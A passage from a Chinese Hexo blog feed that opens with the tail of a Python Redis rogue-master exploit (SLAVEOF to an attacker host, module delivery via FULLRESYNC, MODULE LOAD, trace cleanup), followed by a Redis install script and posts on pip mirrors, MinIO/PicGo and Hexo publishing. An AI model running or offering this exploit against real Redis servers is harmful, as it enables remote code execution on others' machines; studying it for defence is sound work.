class="hljs-keyword">or</span> data.find(<span class="hljs-string">&quot;SYNC&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+FULLRESYNC &quot;</span> + <span class="hljs-string">&quot;Z&quot;</span> * <span class="hljs-number">40</span> + <span class="hljs-string">&quot; 0&quot;</span> + CLRF<br>            resp += <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)) + CLRF<br>            resp = resp.encode()<br>            resp += payload + CLRF.encode()<br>            phase = <span class="hljs-number">4</span><br>        <span class="hljs-keyword">return</span> resp, phase<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        self._sock.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            cli, addr = self._sock.accept()<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = din(cli, <span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">break</span><br>                resp, phase = self.handle(data)<br>                dout(cli, resp)<br>                <span class="hljs-keyword">if</span> phase == <span class="hljs-number">4</span>:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">remote, expfile</span>):<br>    remote.do(<span class="hljs-string">&quot;CONFIG SET dbfilename dump.rdb&quot;</span>)<br>    remote.shell_cmd(<span class="hljs-string">&quot;rm ./&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>    remote.do(<span class="hljs-string">&quot;MODULE UNLOAD system&quot;</span>)<br>    remote.close()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit_redis</span>(<span class="hljs-params">rhost, rport, lhost, lport, exp_file, auth=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">global</span> payload<br>    expfile = os.path.basename(exp_file)<br>    payload = <span class="hljs-built_in">open</span>(exp_file, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>    <span class="hljs-keyword">try</span>:<br>        remote = Remote(rhost, rport)<br>        <span class="hljs-keyword">if</span> auth:<br>            check = remote.do(<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(auth))<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;invalid password&quot;</span> <span class="hljs-keyword">in</span> check:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            info = remote.do(<span class="hljs-string">&quot;INFO&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;NOAUTH&quot;</span> <span class="hljs-keyword">in</span> info:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        remote.do(<span class="hljs-string">&quot;SLAVEOF &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(lhost, lport))<br>        remote.do(<span class="hljs-string">&quot;CONFIG SET dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>        sleep(<span class="hljs-number">2</span>)<br>        rogue = RogueServer(lhost, lport, remote, expfile)<br>        <span class="hljs-keyword">if</span> rogue.exp():<br>            sleep(<span class="hljs-number">2</span>)<br>            remote.do(<span class="hljs-string">&quot;MODULE LOAD ./&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>            remote.do(<span class="hljs-string">&quot;SLAVEOF NO ONE&quot;</span>)<br>            rogue.close()<br>            cleanup(remote, expfile)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h2 id="安装脚本"><a href="#安装脚本" class="headerlink" title="安装脚本"></a>安装脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">检查是否为root用户</span><br>if [ &quot;$(id -u)&quot; -eq 0 ]; then<br>    # 提示用户输入要创建的 Redis 用户名<br>    read -rp &quot;请输入要创建的 Redis 用户名：&quot; redis_user<br><br>    # 密码验证循环<br>    while true; do<br>        # 使用 getpass 获取密码，避免在命令行显示<br>        read -s -p &quot;请设置 Redis 密码认证（至少8个字符，包含字母、数字和特殊字符）：&quot; redis_password<br><br>        # 密码强度验证<br>        if [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[a-z].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[A-Z].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[0-9].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[!@#$%^&amp;*()_+\-=\[\]&#123;&#125;;&#x27;:&quot;\\|,.&lt;&gt;\/?].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $&#123;#redis_password&#125; -ge 8 ]]; then<br>            break<br>        else<br>            echo &quot;密码强度不足，请重新输入。&quot;<br>        fi<br>    done<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换到临时目录</span><br>cd /tmp || exit<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下载 Redis 压缩包</span><br>echo &quot;正在下载 Redis 压缩包...&quot;<br>wget -nv http://download.redis.io/releases/redis-7.2.4.tar.gz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">解压 Redis 压缩包</span><br>echo &quot;正在解压 Redis 压缩包...&quot;<br>tar -zvxf redis-7.2.4.tar.gz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">移动 Redis 文件夹到 /usr/local</span><br>echo &quot;正在移动 Redis 文件夹到 /usr/local...&quot;<br>mv /tmp/redis-7.2.4 /usr/local/redis<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 Redis 用户</span><br>echo &quot;正在创建 Redis 用户...&quot;<br>useradd -s /sbin/nologin -M &quot;$redis_user&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置 Redis 文件夹权限，确保 Redis 用户对文件夹有读写权限</span><br>chown -R &quot;$redis_user:$redis_user&quot; /usr/local/redis<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">复制 Redis 配置文件并设置密码认证</span><br>echo &quot;正在配置 Redis 密码认证...&quot;<br>cp /usr/local/redis/redis.conf /usr/local/redis/redis.conf.backup<br>sed -i &quot;s/^# requirepass foobared$/requirepass $redis_password/&quot; /usr/local/redis/redis.conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 systemd 管理 Redis 服务</span><br>echo &quot;正在配置 Redis 服务...&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 systemd 服务文件</span><br>cat &gt; /etc/systemd/system/redis.service &lt;&lt;EOF<br>[Unit]<br>Description=Redis Server<br>After=network.target<br><br>[Service]<br>User=$redis_user<br>Group=$redis_user<br>WorkingDirectory=/usr/local/redis<br>ExecStart=/usr/local/redis/src/redis-server /usr/local/redis/redis.conf<br>ExecReload=/bin/kill -HUP $&#123;MAINPID&#125;<br>ExecStop=/bin/kill -TERM $&#123;MAINPID&#125;<br><br>[Install]<br>WantedBy=multi-user.target<br>EOF<br><br>    # 启动 Redis 服务<br>    echo &quot;正在启动 Redis 服务...&quot;<br>    systemctl daemon-reload &amp;&amp; systemctl enable redis &amp;&amp; systemctl start redis<br><br>    echo &quot;Redis 服务已启动。&quot;<br>else<br>    echo &quot;当前用户非root用户，无法创建 Redis 用户和启动服务。请使用root权限运行该脚本。&quot;<br>fi<br></code></pre></td></tr></table></figure><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://hellogithub.com/report/db-engines/">https://hellogithub.com/report/db-engines/</a></p><p><a href="https://blog.csdn.net/zkaqlaoniao/article/details/134441323">https://blog.csdn.net/zkaqlaoniao/article/details/134441323</a></p><p><a href="https://blog.51cto.com/u_13540373/4861152">https://blog.51cto.com/u_13540373/4861152</a></p><p><a href="https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3">https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Redis安装&quot;&gt;&lt;a href=&quot;#Redis安装&quot; class=&quot;headerlink&quot; title=&quot;Redis安装&quot;&gt;&lt;/a&gt;Redis安装&lt;/h1&gt;&lt;p&gt;去&lt;a href=&quot;http://download.redis.io/releases%E9%80%</summary>
      
    
    
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>pip提升下载速度</title>
    <link href="http://example.com/2024/05/08/pip%E6%8F%90%E5%8D%87%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6/"/>
    <id>http://example.com/2024/05/08/pip%E6%8F%90%E5%8D%87%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6/</id>
    <published>2024-05-08T11:56:08.000Z</published>
    <updated>2024-05-08T12:54:38.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pip提升下载速度"><a href="#pip提升下载速度" class="headerlink" title="pip提升下载速度"></a>pip提升下载速度</h2><h3 id="临时换源"><a href="#临时换源" class="headerlink" title="临时换源"></a>临时换源</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">pip install &lt;<span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame&gt;  -i https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br></code></pre></td></tr></table></figure><p><strong>国内常见pip源：</strong></p><table><thead><tr><th align="center">镜像名称</th><th align="center">镜像地址</th></tr></thead><tbody><tr><td align="center">清华大学</td><td align="center"><a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></td></tr><tr><td align="center">阿里云</td><td align="center"><a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></td></tr><tr><td align="center">中国科技大学</td><td align="center"><a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a></td></tr><tr><td align="center">豆瓣</td><td align="center"><a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a></td></tr><tr><td align="center">网易</td><td align="center"><a href="https://mirrors.163.com/pypi/simple/">https://mirrors.163.com/pypi/simple/</a></td></tr><tr><td align="center">百度云</td><td align="center"><a href="https://mirror.baidu.com/pypi/simple/">https://mirror.baidu.com/pypi/simple/</a></td></tr><tr><td align="center">华为云</td><td align="center"><a href="https://mirrors.huaweicloud.com/repository/pypi/simple/">https://mirrors.huaweicloud.com/repository/pypi/simple/</a></td></tr><tr><td align="center">腾讯云</td><td align="center"><a href="https://mirrors.cloud.tencent.com/pypi/simple/">https://mirrors.cloud.tencent.com/pypi/simple/</a></td></tr></tbody></table><h3 id="设为默认"><a href="#设为默认" class="headerlink" title="设为默认"></a>设为默认</h3><p><strong>pip 版本 (&gt;&#x3D;10.0.0) ：</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> pip install --upgrade pip<br>pip config <span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span>.<span class="hljs-built_in">index</span>-url https://pypi.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/simple<br></code></pre></td></tr></table></figure><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p><strong>使用–proxy参数指定代理服务器的地址和端口号</strong></p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">pip install &lt;<span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame&gt; --proxy http:<span class="hljs-comment">//127.0.0.1:7890</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;pip提升下载速度&quot;&gt;&lt;a href=&quot;#pip提升下载速度&quot; class=&quot;headerlink&quot; title=&quot;pip提升下载速度&quot;&gt;&lt;/a&gt;pip提升下载速度&lt;/h2&gt;&lt;h3 id=&quot;临时换源&quot;&gt;&lt;a href=&quot;#临时换源&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="杂项" scheme="http://example.com/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>minio+picgo搭建个人服务器图床</title>
    <link href="http://example.com/2024/05/08/minio-picgo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%BA%8A/"/>
    <id>http://example.com/2024/05/08/minio-picgo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%BA%8A/</id>
    <published>2024-05-07T16:06:32.000Z</published>
    <updated>2024-05-26T12:01:33.460Z</updated>
    
    <content type="html"><![CDATA[<p>目的：利用minio+picgo搭建个人服务器图床</p><h2 id="1-Ubuntu安装docker"><a href="#1-Ubuntu安装docker" class="headerlink" title="1.Ubuntu安装docker"></a>1.Ubuntu安装docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install docker.io docker-compose<br>docker -v<br></code></pre></td></tr></table></figure><h2 id="2-docker部署minio"><a href="#2-docker部署minio" class="headerlink" title="2.docker部署minio"></a>2.docker部署minio</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo docker run -p 9000:9000 -p 9001:9001 --name minio \<br>-d --restart=always \<br>-e &quot;MINIO_ACCESS_KEY=user_866&quot; \<br>-e &quot;MINIO_SECRET_KEY=password_54646&quot; \<br>-v /data/minio/data:/data \<br>-v /data/minio/config:/root/.minio minio/minio server \<br>--console-address &quot;:9000&quot; --address &quot;:9001&quot; /data<br></code></pre></td></tr></table></figure><p>服务器打开对应的端口:9000,9001</p><ul><li><code>sudo</code>: 以超级用户权限运行 Docker 命令。</li><li><code>docker run</code>: 创建一个新的 Docker 容器并运行一个命令。</li><li><code>-p 9000:9000</code>: 将容器的 9000 端口映射到主机的 9000 端口。</li><li><code>-p 9001:9001</code>: 将容器的 9001 端口映射到主机的 9001 端口。</li><li><code>--name minio</code>: 设置容器的名称为 minio。</li><li><code>-d</code>: 在后台运行容器。</li><li><code>--restart=always</code>: 确保容器总是重新启动，即使在重启后也是如此。</li><li><code>-e &quot;MINIO_ACCESS_KEY=user&quot;</code>: 设置环境变量 <code>MINIO_ACCESS_KEY</code>，这是访问 MinIO 服务的访问密钥。</li><li><code>-e &quot;MINIO_SECRET_KEY=pasword&quot;</code>: 设置环境变量 <code>MINIO_SECRET_KEY</code>，这是访问 MinIO 服务的秘密密钥。</li><li><code>-v /data/data:/data</code>: 将主机上的 <code>/data/data</code> 目录挂载到容器的 <code>/data</code> 目录。</li><li><code>-v /data/config:/root/.minio</code>: 将主机上的 <code>/data/config</code> 目录挂载到容器的 <code>/root/.minio</code> 目录。</li><li><code>minio/minio server</code>: 运行 MinIO 服务。</li><li><code>--console-address &quot;:9000&quot;</code>: 设置 MinIO 的控制台地址，端口为 9000。</li><li><code>--address &quot;:9001&quot;</code>: 设置 MinIO 服务的监听地址，端口为 9001。</li><li><code>/data</code>: 指定 MinIO 服务的数据存储路径。</li></ul><h2 id="3-访问MinIO-的控制台地址"><a href="#3-访问MinIO-的控制台地址" class="headerlink" title="3.访问MinIO 的控制台地址"></a>3.访问MinIO 的控制台地址</h2><p><a href="http://your_ip:9000/">http://your_ip:9000</a></p><h4 id="Create-Bucket创建存储"><a href="#Create-Bucket创建存储" class="headerlink" title="Create Bucket创建存储"></a>Create Bucket创建存储</h4><p><img src="/img/course/image-20240508195813481.png" alt="image-20240508195813481"></p><h4 id="Access-Keys设置秘钥"><a href="#Access-Keys设置秘钥" class="headerlink" title="Access Keys设置秘钥"></a><strong>Access Keys</strong>设置秘钥</h4><p><img src="/img/course/image-20240508195914554.png" alt="image-20240508195914554"></p><h2 id="4-下载picgo"><a href="#4-下载picgo" class="headerlink" title="4.下载picgo"></a>4.下载picgo</h2><p><a href="https://github.com/Molunerfinn/PicGo/releases">picgo下载</a></p><p><strong>minio插件安装</strong></p><p><img src="/img/course/image-20240508200314953.png" alt="image-20240508200314953"></p><p><strong>图床设置</strong></p><p><img src="/img/course/image-20240508200641746.png" alt="image-20240508200641746"></p><h2 id="5-上传验证"><a href="#5-上传验证" class="headerlink" title="5.上传验证"></a>5.上传验证</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目的：利用minio+picgo搭建个人服务器图床&lt;/p&gt;
&lt;h2 id=&quot;1-Ubuntu安装docker&quot;&gt;&lt;a href=&quot;#1-Ubuntu安装docker&quot; class=&quot;headerlink&quot; title=&quot;1.Ubuntu安装docker&quot;&gt;&lt;/a&gt;1.Ubu</summary>
      
    
    
    
    
    <category term="服务器" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客编辑</title>
    <link href="http://example.com/2024/04/25/%E6%96%B0%E5%BB%BA%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2024/04/25/%E6%96%B0%E5%BB%BA%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E5%91%BD%E4%BB%A4/</id>
    <published>2024-04-25T15:18:20.000Z</published>
    <updated>2024-06-18T05:48:06.848Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-打开管理员powershell"><a href="#1-打开管理员powershell" class="headerlink" title="1.打开管理员powershell"></a>1.打开管理员powershell</h2><p><strong>执行命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#到你的博客根目录下面</span><br><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">cd</span> E:\Blog<br><span class="hljs-built_in">PS</span> E:\Blog&gt; hexo new <span class="hljs-string">&quot;新建一篇文章的命令&quot;</span><br>INFO  Validating config<br>INFO  Created: E:\Blog\source\_posts\新建一篇<br></code></pre></td></tr></table></figure><h2 id="2-去博客根目录下的E-Blog-source-posts"><a href="#2-去博客根目录下的E-Blog-source-posts" class="headerlink" title="2.去博客根目录下的E:\Blog\source_posts"></a>2.去博客根目录下的E:\Blog\source_posts</h2><p><strong>根目录结构</strong>（E:\Blog为你安装hexo的目录）</p><p><img src="/img/course/image-20240425233916133.png" alt="image-20240425233916133"></p><p><strong>打开新建的文章</strong></p><p><img src="/img/course/image-20240425232632671.png" alt="image-20240425232632671"></p><p><strong>使用编辑器进行编写，推荐Typora</strong></p><p><img src="/img/course/image-20240425232739254.png" alt="image-20240425232739254"></p><h2 id="3-推送博客到服务器"><a href="#3-推送博客到服务器" class="headerlink" title="3.推送博客到服务器"></a>3.推送博客到服务器</h2><p><strong>执行命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 清理缓存</span><br><span class="hljs-built_in">PS</span> E:\Blog&gt; hexo cl<br>INFO  Validating config<br>INFO  Deleted database.<br>INFO  Deleted public folder.<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 生成静态页面</span><br><span class="hljs-built_in">PS</span> E:\Blog&gt; hexo g<br>INFO  Validating config<br>INFO  <span class="hljs-built_in">Start</span> processing<br><br>INFO  Files loaded <span class="hljs-keyword">in</span> <span class="hljs-number">1.84</span> s<br>INFO  Generated: about/index.html<br>INFO  <span class="hljs-number">297</span> files generated <span class="hljs-keyword">in</span> <span class="hljs-number">1.11</span> s<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 推送到服务器</span><br><span class="hljs-built_in">PS</span> E:\Blog&gt; hexo d<br>INFO  Validating config<br>INFO  Deploying: git<br>INFO  Clearing .deploy_git folder...<br>INFO  Copying files from public folder...<br>INFO  Copying files from extend dirs...<br>[<span class="hljs-type">master</span> <span class="hljs-type">d7809d4</span>] Site updated: <span class="hljs-number">2024</span><span class="hljs-literal">-04-25</span> <span class="hljs-number">23</span>:<span class="hljs-number">31</span>:<span class="hljs-number">33</span><br> <span class="hljs-number">33</span> files changed, <span class="hljs-number">959</span> insertions(+), <span class="hljs-number">264</span> deletions(-)<br> create mode <span class="hljs-number">100644</span> <span class="hljs-string">&quot;2024/04/25/\346\226\260\345\273\272\344\270\200\347\257\207\346\226\207\347\253\240\347\232\204\345\221\275\344\273\244/index.html&quot;</span><br> create mode <span class="hljs-number">100644</span> img/course/image<span class="hljs-literal">-20240425232632671</span>.png<br> create mode <span class="hljs-number">100644</span> img/course/image<span class="hljs-literal">-20240425232739254</span>.png<br>git@masanli.online<span class="hljs-string">&#x27;s password: 在这里输入密码</span><br><span class="hljs-string">Enumerating objects: 141, done.</span><br><span class="hljs-string">Counting objects: 100% (141/141), done.</span><br><span class="hljs-string">Delta compression using up to 16 threads</span><br><span class="hljs-string">Compressing objects: 100% (52/52), done.</span><br><span class="hljs-string">Writing objects: 100% (76/76), 280.38 KiB | 5.50 MiB/s, done.</span><br><span class="hljs-string">Total 76 (delta 35), reused 0 (delta 0), pack-reused 0</span><br><span class="hljs-string">To masanli.online:/home/git/blog.git</span><br><span class="hljs-string">   394df28..d7809d4  HEAD -&gt; master</span><br><span class="hljs-string">branch &#x27;</span>master<span class="hljs-string">&#x27; set up to track &#x27;</span>git@masanli.online:/home/git/blog.git/master<span class="hljs-string">&#x27;.</span><br><span class="hljs-string">INFO  Deploy done: git</span><br></code></pre></td></tr></table></figure><p><strong>推送成功访问网站进行检查</strong></p><h1 id="一级标题快捷命令Ctrl-1"><a href="#一级标题快捷命令Ctrl-1" class="headerlink" title="一级标题快捷命令Ctrl+1"></a>一级标题快捷命令Ctrl+1</h1><h2 id="二级标题快捷命令Ctrl-2"><a href="#二级标题快捷命令Ctrl-2" class="headerlink" title="二级标题快捷命令Ctrl+2"></a>二级标题快捷命令Ctrl+2</h2><p><strong>新建代码块Ctrl+shift+k</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo <br></code></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p><strong>插入图片直接Ctrl+v</strong></p><h3 id="插入图片注意事项"><a href="#插入图片注意事项" class="headerlink" title="插入图片注意事项"></a>插入图片注意事项</h3><p>需要将图片移到博客根目录下的E:\Blog\source\img，如果没有可以新建一个img用来图片，并且为了图片在网站上能够正常显示，必须修改md文件中图片路径格式</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>1.进入源代码模式</p><p><img src="/img/course/image-20240425234346812.png" alt="image-20240425234346812"></p><p>2.将例如<code>![image-20240425234346812](/img/course/image-20240425234346812.png)</code>改为<code>![image-20240425234346812](/img/course/image-20240425234346812.png)</code>的格式</p><p><img src="/img/course/image-20240425234705843.png" alt="image-20240425234705843"></p><p>3.便捷方法：打开typora  文件-&gt;偏好设置-&gt;图像中的图像默认保存位置改为E:\Blog\source\img（按自己博客目录的文件夹名称为准）</p><p><img src="/img/course/image-20240425234850021.png" alt="image-20240425234850021"></p><p>这样，只需在编辑好推送前，使用typora带的查找替换功能将所有<code>E:\Blog\source\</code>替换为服务器对应路径<code>/img/course/</code></p><p>再使用hexo命令推送上去就可以直接看到文章里面的图片了</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo cl</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-打开管理员powershell&quot;&gt;&lt;a href=&quot;#1-打开管理员powershell&quot; class=&quot;headerlink&quot; title=&quot;1.打开管理员powershell&quot;&gt;&lt;/a&gt;1.打开管理员powershell&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;执行</summary>
      
    
    
    
    
    <category term="新建博客" scheme="http://example.com/tags/%E6%96%B0%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Linux磁盘分区与挂载</title>
    <link href="http://example.com/2024/04/14/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E4%B8%8E%E6%8C%82%E8%BD%BD/"/>
    <id>http://example.com/2024/04/14/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E4%B8%8E%E6%8C%82%E8%BD%BD/</id>
    <published>2024-04-14T11:33:27.000Z</published>
    <updated>2024-05-26T12:02:15.980Z</updated>
    
